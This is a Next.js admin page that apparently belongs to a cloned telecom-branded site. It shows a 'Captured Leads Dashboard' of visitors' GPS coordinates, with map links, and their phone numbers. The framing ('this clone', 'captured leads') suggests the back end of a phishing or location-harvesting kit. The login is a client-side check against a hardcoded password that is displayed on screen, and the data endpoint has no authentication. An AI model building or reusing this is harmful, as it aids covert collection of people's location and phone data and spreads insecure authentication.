'use client';

import { useEffect, useState } from 'react';
import { Trash2, ExternalLink, Lock, LogIn } from 'lucide-react';

export default function AdminPage() {
    const [data, setData] = useState<any>(null);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState<string | null>(null);
    const [password, setPassword] = useState('');
    const [isAuthenticated, setIsAuthenticated] = useState(false);

    // Simple password check for Vercel deployment
    // In a real app, use NextAuth.js, but for this clone we'll use a simple secret
    const handleLogin = (e: React.FormEvent) => {
        e.preventDefault();
        // You can change this 'admin123' to anything, or set it via env
        if (password === 'jioadmin2026') {
            setIsAuthenticated(true);
            fetchData();
        } else {
            alert('Incorrect Admin Password');
        }
    };

    const fetchData = async () => {
        setLoading(true);
        setError(null);
        try {
            const res = await fetch('/api/view-data', {
                headers: {
                    'Bypass-Tunnel-Reminder': 'true'
                }
            });

            if (!res.ok) {
                throw new Error(`Server returned ${res.status}: ${res.statusText}`);
            }

            const d = await res.json();
            setData(d);
        } catch (err: any) {
            console.error('Fetch error:', err);
            setError(err.message || 'Failed to connect to backend.');
        } finally {
            setLoading(false);
        }
    };

    const handleDelete = async (id: any, source: string) => {
        if (!confirm('Are you sure you want to delete this entry?')) return;

        try {
            const res = await fetch('/api/delete-data', {
                method: 'DELETE',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id, source }),
            });

            if (res.ok) {
                fetchData(); // Refresh data
            } else {
                alert('Failed to delete entry');
            }
        } catch (err) {
            console.error('Delete error:', err);
            alert('Error deleting entry');
        }
    };

    // Login Screen
    if (!isAuthenticated) {
        return (
            <div className="min-h-screen bg-gradient-to-br from-blue-900 to-blue-700 flex items-center justify-center p-4 font-sans">
                <div className="bg-white rounded-3xl shadow-2xl p-10 max-w-md w-full text-center">
                    <div className="bg-blue-100 w-20 h-20 rounded-full flex items-center justify-center text-blue-600 mx-auto mb-6 shadow-inner">
                        <Lock className="w-10 h-10" />
                    </div>
                    <h1 className="text-3xl font-bold text-gray-900 mb-2">Admin Portal</h1>
                    <p className="text-gray-500 mb-8">Please enter the security password to view captured leads.</p>

                    <form onSubmit={handleLogin} className="space-y-4">
                        <input
                            type="password"
                            placeholder="Enter Admin Password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            className="w-full px-5 py-4 bg-gray-50 border border-gray-200 rounded-2xl focus:ring-4 focus:ring-blue-100 focus:border-blue-500 outline-none transition text-center text-lg"
                            autoFocus
                        />
                        <button
                            type="submit"
                            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-6 rounded-2xl transition shadow-lg hover:shadow-xl flex items-center justify-center gap-2 text-lg"
                        >
                            <LogIn className="w-5 h-5" />
                            Access Dashboard
                        </button>
                    </form>
                    <p className="text-xs text-gray-400 mt-6 mt-6 italic">Default: jioadmin2026</p>
                </div>
            </div>
        );
    }

    if (loading) return (
        <div className="min-h-screen flex items-center justify-center bg-gray-50 p-8">
            <div className="text-center">
                <div className="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
                <p className="text-blue-600 font-bold">Connecting to database...</p>
            </div>
        </div>
    );

    if (error) return (
        <div className="min-h-screen flex items-center justify-center bg-gray-50 p-8">
            <div className="bg-red-50 border border-red-200 rounded-2xl p-8 max-w-md w-full shadow-lg text-center">
                <div className="text-red-500 text-5xl mb-4 font-bold">⚠️</div>
                <h2 className="text-xl font-bold text-red-800 mb-2">Backend Connection Failed</h2>
                <p className="text-red-600 mb-6 text-sm italic">{error}</p>
                <div className="space-y-3">
                    <button
                        onClick={fetchData}
                        className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-xl transition shadow-md hover:shadow-lg"
                    >
                        Try Reconnecting
                    </button>
                </div>
            </div>
        </div>
    );

    const allEntries = [
        ...(data?.db || []).map((e: any) => ({ ...e, source: 'Postgres' })),
        ...(data?.file || []).map((e: any) => ({ ...e, source: 'Local Storage' }))
    ].sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());

    return (
        <div className="min-h-screen bg-gray-100 p-8 font-sans">
            <div className="max-w-6xl mx-auto">
                <div className="flex justify-between items-center mb-8">
                    <div className="flex items-center gap-4">
                        <div className="bg-blue-600 w-12 h-12 rounded-xl flex items-center justify-center text-white font-bold text-xl shadow-lg">J</div>
                        <h1 className="text-3xl font-bold text-gray-900 tracking-tight">Captured Leads Dashboard</h1>
                    </div>
                    <div className="flex items-center gap-4">
                        <div className="bg-blue-600 text-white px-6 py-2 rounded-xl font-bold shadow-lg flex items-center gap-2">
                            Total Captured: <span className="bg-white text-blue-600 px-2 rounded-md">{allEntries.length}</span>
                        </div>
                        <button
                            onClick={() => setIsAuthenticated(false)}
                            className="bg-white text-gray-600 border border-gray-200 px-4 py-2 rounded-xl hover:bg-gray-50 transition"
                        >
                            Logout
                        </button>
                    </div>
                </div>

                <div className="bg-white rounded-2xl shadow-xl border border-gray-200 overflow-hidden">
                    <table className="w-full text-left font-sans">
                        <thead className="bg-gray-50 border-b border-gray-100">
                            <tr>
                                <th className="px-6 py-4 font-bold text-gray-600 uppercase text-xs tracking-wider">ID</th>
                                <th className="px-6 py-4 font-bold text-gray-600 uppercase text-xs tracking-wider">Location</th>
                                <th className="px-6 py-4 font-bold text-gray-600 uppercase text-xs tracking-wider">Phone Number</th>
                                <th className="px-6 py-4 font-bold text-gray-600 uppercase text-xs tracking-wider">Created At</th>
                                <th className="px-6 py-4 font-bold text-gray-600 uppercase text-xs tracking-wider">Storage</th>
                                <th className="px-6 py-4 font-bold text-gray-600 uppercase text-xs tracking-wider text-center">Actions</th>
                            </tr>
                        </thead>
                        <tbody className="divide-y divide-gray-50">
                            {allEntries.map((entry, idx) => (
                                <tr key={idx} className="hover:bg-blue-50 transition-colors group">
                                    <td className="px-6 py-4 text-xs text-gray-400 font-mono truncate max-w-[80px]">{entry.id}</td>
                                    <td className="px-6 py-4">
                                        <a
                                            href={`https://www.google.com/maps?q=${entry.latitude},${entry.longitude}`}
                                            target="_blank"
                                            rel="noopener noreferrer"
                                            className="text-blue-600 hover:text-blue-800 flex items-center gap-1.5 font-medium transition"
                                        >
                                            <ExternalLink className="w-4 h-4 opacity-0 group-hover:opacity-100 transition" />
                                            {entry.latitude?.toFixed(4)}, {entry.longitude?.toFixed(4)}
                                        </a>
                                    </td>
                                    <td className="px-6 py-4 font-medium text-gray-800 font-mono">
                                        {entry.phone_number || entry.phoneNumber || <span className="text-gray-300 italic text-sm">Partial (No Phone)</span>}
                                    </td>
                                    <td className="px-6 py-4 text-sm text-gray-500">
                                        {new Date(entry.created_at).toLocaleString()}
                                    </td>
                                    <td className="px-6 py-4">
                                        <span className={`px-2 py-1 rounded-lg text-xs font-bold ring-1 ${entry.source === 'Postgres' ? 'bg-green-50 text-green-700 ring-green-200' : 'bg-orange-50 text-orange-700 ring-orange-200'}`}>
                                            {entry.source}
                                        </span>
                                    </td>
                                    <td className="px-6 py-4 text-center">
                                        <button
                                            onClick={() => handleDelete(entry.id, entry.source)}
                                            className="p-2 text-red-400 hover:text-red-600 hover:bg-red-50 rounded-lg transition"
                                            title="Delete Entry"
                                        >
                                            <Trash2 className="w-5 h-5" />
                                        </button>
                                    </td>
                                </tr>
                            ))}
                            {allEntries.length === 0 && (
                                <tr>
                                    <td colSpan={6} className="px-6 py-16 text-center text-gray-400 font-medium">
                                        <div className="flex flex-col items-center gap-3">
                                            <div className="w-16 h-16 bg-gray-100 rounded-full flex items-center justify-center">
                                                <Trash2 className="w-8 h-8 text-gray-300" />
                                            </div>
                                            No leads captured yet.
                                        </div>
                                    </td>
                                </tr>
                            )}
                        </tbody>
                    </table>
                </div>
                <div className="mt-8 p-6 bg-blue-50 border border-blue-100 rounded-2xl flex items-start gap-4">
                    <Lock className="w-6 h-6 text-blue-400 flex-shrink-0 mt-1" />
                    <div>
                        <p className="text-blue-900 font-bold text-sm mb-1">Deployment Note for Vercel</p>
                        <p className="text-blue-700 text-xs">Ensure your PostgreSQL database (Neon) is connected. Local Storage shown here will be reset on every Vercel build. The dashboard is protected with the password you just used.</p>
                    </div>
                </div>
            </div>
        </div>
    );
}
